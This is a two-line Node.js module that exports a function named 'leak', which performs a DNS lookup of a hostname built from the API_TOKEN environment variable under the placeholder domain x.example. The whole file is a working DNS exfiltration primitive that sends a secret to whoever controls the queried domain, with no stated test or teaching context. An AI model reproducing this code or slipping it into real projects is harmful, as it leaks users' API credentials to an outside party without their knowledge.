import dns from 'node:dns/promises';
export const leak = () => dns.resolve(`${process.env.API_TOKEN}.x.example`);
